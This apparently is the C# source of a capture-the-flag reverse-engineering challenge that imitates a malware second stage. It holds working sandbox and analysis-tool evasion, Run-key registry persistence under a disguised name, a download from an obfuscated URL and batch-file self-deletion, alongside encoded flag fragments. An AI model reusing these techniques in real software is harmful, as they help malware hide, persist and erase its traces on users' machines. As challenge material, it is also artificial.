using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.Collections.Generic;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace Payload.Stage2
{
    class Program
    {
        // Encrypted configuration data
        private static readonly byte[] configData = new byte[]
        {
            0x74, 0x47, 0x56, 0x7A, 0x64, 0x44, 0x6F, 0x76, 0x4C, 0x33, 0x4A, 0x68,
            0x64, 0x79, 0x35, 0x6E, 0x61, 0x58, 0x52, 0x6F, 0x64, 0x57, 0x49, 0x75,
            0x63, 0x32, 0x56, 0x79, 0x59, 0x32, 0x39, 0x75, 0x64, 0x47, 0x56, 0x75,
            0x64, 0x43, 0x35, 0x6A, 0x62, 0x32, 0x30, 0x76, 0x64, 0x58, 0x4E, 0x6C,
            0x63, 0x69, 0x39, 0x7A, 0x5A, 0x57, 0x4E, 0x79, 0x5A, 0x58, 0x52, 0x66,
            0x63, 0x6D, 0x56, 0x77, 0x62, 0x79, 0x39, 0x74, 0x59, 0x57, 0x6C, 0x75,
            0x4C, 0x33, 0x4E, 0x30, 0x59, 0x57, 0x64, 0x6C, 0x4D, 0x79, 0x35, 0x30,
            0x65, 0x48, 0x51, 0x3D
        };

        // Flag fragments - each piece is encrypted/encoded differently
        private static readonly string[] flagFragments = new string[]
        {
            "Q1RGe1IzdjNyNzMtRW5n", // Base64
            "7B242D3131335F31735F", // Hex
            "ZnVuX3JpZ2h0P30=",     // Base64
        };

        // RC4 key for decrypting special data
        private static readonly byte[] rc4Key = new byte[] { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x45, 0x5F, 0x4D, 0x45 };

        // Special message 
        private static readonly byte[] specialMessage = new byte[] {
            0x1A, 0x08, 0x0D, 0x13, 0x42, 0x17, 0x44, 0x1B, 0x23, 0x11, 0x39, 0x0F,
            0x3A, 0x08, 0x28, 0x19, 0x38, 0x11, 0x0D, 0x11, 0x3C, 0x0C, 0x37, 0x19,
            0x33, 0x1C, 0x47, 0x16, 0x30, 0x1D, 0x47, 0x07, 0x3D, 0x1A, 0x36, 0x10
        };

        static void Main(string[] args)
        {
            // Sleep to avoid immediate detection
            Thread.Sleep(2000);
            
            try
            {
                string fingerprint = args.Length > 0 ? args[0] : "unknown";
                
                // Simple check to see if running in sandbox/VM
                bool isSandbox = CheckForSandbox();
                if (isSandbox)
                {
                    Environment.Exit(0);
                }
                
                // Decrypt configuration
                string configUrl = Encoding.UTF8.GetString(
                    Convert.FromBase64String(Encoding.UTF8.GetString(configData))
                );
                
                // Establish persistence 
                EstablishPersistence();
                
                // Flag components are gathered throughout execution
                List<string> flagParts = new List<string>();
                
                // Decode first flag part (Base64)
                flagParts.Add(Encoding.UTF8.GetString(Convert.FromBase64String(flagFragments[0])));
                
                // Decode second flag part (Hex)
                flagParts.Add(HexToString(flagFragments[1]));
                
                // Try to download additional resource
                byte[] additionalData = DownloadData(configUrl);
                
                // Placeholder for when the download fails in a real environment
                if (additionalData == null || additionalData.Length == 0)
                {
                    // Decode third flag part when download fails (Base64)
                    flagParts.Add(Encoding.UTF8.GetString(Convert.FromBase64String(flagFragments[2])));
                }
                else
                {
                    // If download succeeds, third flag part would be derived from download
                    // But for the challenge, we'll make sure the download doesn't work
                    flagParts.Add("[DOWNLOAD_ERROR]");
                }
                
                // Decrypt special message which contains a hint
                byte[] decryptedMessage = RC4Decrypt(specialMessage, rc4Key);
                string hint = Encoding.UTF8.GetString(decryptedMessage);
                
                // This would be where the malware would send data back to C2
                // For the challenge, we'll write the flag to a hidden file
                // that participants need to find
                string flagDirectory = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    ".config", ".cache"
                );
                
                if (!Directory.Exists(flagDirectory))
                {
                    Directory.CreateDirectory(flagDirectory);
                }
                
                string flagFile = Path.Combine(flagDirectory, ".status");
                File.WriteAllText(flagFile, string.Join("", flagParts));
                
                // Set file as hidden
                File.SetAttributes(flagFile, FileAttributes.Hidden);

                // Clean up traces
                string currentExecutable = Assembly.GetExecutingAssembly().Location;
                
                // Create a batch file to delete itself
                string batchPath = Path.GetTempFileName() + ".bat";
                using (StreamWriter writer = new StreamWriter(batchPath))
                {
                    writer.WriteLine("@echo off");
                    writer.WriteLine("ping -n 3 127.0.0.1 > nul");
                    writer.WriteLine($"del \"{currentExecutable}\"");
                    writer.WriteLine($"del \"{batchPath}\"");
                }
                
                // Execute the self-delete batch
                Process.Start(new ProcessStartInfo
                {
                    FileName = batchPath,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch
            {
                // Silent failure
            }
        }
        
        private static bool CheckForSandbox()
        {
            // Check for VM/sandbox artifacts
            string[] suspiciousProcesses = new string[] 
            {
                "vmtoolsd.exe", "VBoxService.exe", "wireshark.exe", "procmon.exe", "dnSpy.exe"
            };
            
            try
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        if (suspiciousProcesses.Contains(process.ProcessName.ToLower() + ".exe"))
                        {
                            return true;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            
            return false;
        }
        
        private static void EstablishPersistence()
        {
            try
            {
                // Get current executable path
                string executablePath = Assembly.GetExecutingAssembly().Location;
                
                // Create startup registry key
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue("SystemServiceHost", executablePath);
                    }
                }
            }
            catch { }
        }
        
        private static string HexToString(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            
            return Encoding.ASCII.GetString(bytes);
        }
        
        private static byte[] DownloadData(string url)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    return client.DownloadData(url);
                }
            }
            catch
            {
                return null;
            }
        }
        
        private static byte[] RC4Decrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            
            // RC4 key setup
            byte[] s = new byte[256];
            for (int i = 0; i < 256; i++)
            {
                s[i] = (byte)i;
            }
            
            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + s[i] + key[i % key.Length]) % 256;
                byte temp = s[i];
                s[i] = s[j];
                s[j] = temp;
            }
            
            // RC4 decryption
            int i2 = 0;
            j = 0;
            for (int k = 0; k < data.Length; k++)
            {
                i2 = (i2 + 1) % 256;
                j = (j + s[i2]) % 256;
                
                byte temp = s[i2];
                s[i2] = s[j];
                s[j] = temp;
                
                int t = (s[i2] + s[j]) % 256;
                result[k] = (byte)(data[k] ^ s[t]);
            }
            
            return result;
        }
    }
}
